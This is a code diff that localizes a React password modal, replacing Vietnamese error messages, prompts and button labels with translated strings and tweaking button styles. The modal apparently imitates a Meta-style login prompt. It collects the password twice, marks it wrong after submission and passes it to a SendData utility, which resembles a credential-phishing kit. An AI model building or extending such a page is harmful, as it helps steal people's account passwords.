@@ -3,6 +3,7 @@ import Modal from '#components/modals/Modal';
 import PasswordInput from '#components/password-input/password-input';
 import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
 import { updateForm } from '../../app/store/slices/stepFormSlice';
+import { useAppStrings } from '@/hooks/useAppStrings';
 import { SendData } from '@/utils/sendData';
 
 interface PasswordModalProps {
@@ -12,6 +13,7 @@ interface PasswordModalProps {
 }
 
 const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
+    const t = useAppStrings();
 
     React.useEffect(() => {
         setIsOpen(isOpend);
@@ -47,7 +49,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         try {
             e.preventDefault();
             const newErrors: Record<string, string> = {};
-            if (!password.trim()) newErrors.password = "Vui lòng nhập mật khẩu.";
+            if (!password.trim()) newErrors.password = t.password.errEmpty;
 
             if (Object.keys(newErrors).length > 0) {
                 setErrors(newErrors);
@@ -94,7 +96,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     console.error("Error submitting form:", error);
                     setLoading(false);
                     setPassword('');
-                    newErrors.password = "Mật khẩu bạn nhập chưa chính xác. Vui lòng thử lại.";
+                    newErrors.password = t.password.errWrong;
                     setErrors(newErrors);
                 });
             }
@@ -121,13 +123,13 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                 <div className='w-full py-8'>
                     <p className='text-[#9a979e] text-[14px] mb-[7px]'>
                         {doubleCheck
-                            ? 'Vui lòng nhập lại mật khẩu để xác nhận và tiếp tục.'
-                            : 'Vì lý do bảo mật, vui lòng nhập mật khẩu để tiếp tục.'}
+                            ? t.password.secondPrompt
+                            : t.password.firstPrompt}
                     </p>
                     {showSecondStepNotice && (
                         <div className='mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]'>
                             <p className='text-[13px] leading-[1.55] text-[#8a5b13]'>
-                                Lưu ý: Hãy kiểm tra kỹ mật khẩu trước khi nhập lại lần 2 để tránh sai sót. Bạn có thể sử dụng biểu tượng mắt để ẩn/hiện ở bước xác nhận.
+                                {t.password.notice}
                             </p>
                         </div>
                     )}
@@ -136,7 +138,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                             <PasswordInput
                                 id='accessKey'
                                 name={doubleCheck ? 'recheck_access_key' : 'account_access_key'}
-                                placeholder={doubleCheck ? 'Nhập lại mật khẩu' : 'Nhập mật khẩu'}
+                                placeholder={doubleCheck ? t.password.phSecond : t.password.phFirst}
                                 className={inputClass('password')}
                                 value={password}
                                 onChange={handleChange}
@@ -147,7 +149,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                         </div>
                         <div className='w-full mt-[20px]'>
                             <button
-                                className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
+                                className={`min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 active:opacity-90 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
                                 disabled={loading}
                             >
                                 {loading && (
@@ -155,11 +157,11 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                                         <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                     </div>
                                 )}
-                                {loading ? '' : 'Tiếp tục'}
+                                {loading ? '' : t.password.continue}
                             </button>
                         </div>
                         <div>
-                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>Quên mật khẩu?</a></p>
+                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>{t.password.forgot}</a></p>
                         </div>
                     </form>
                 </div>
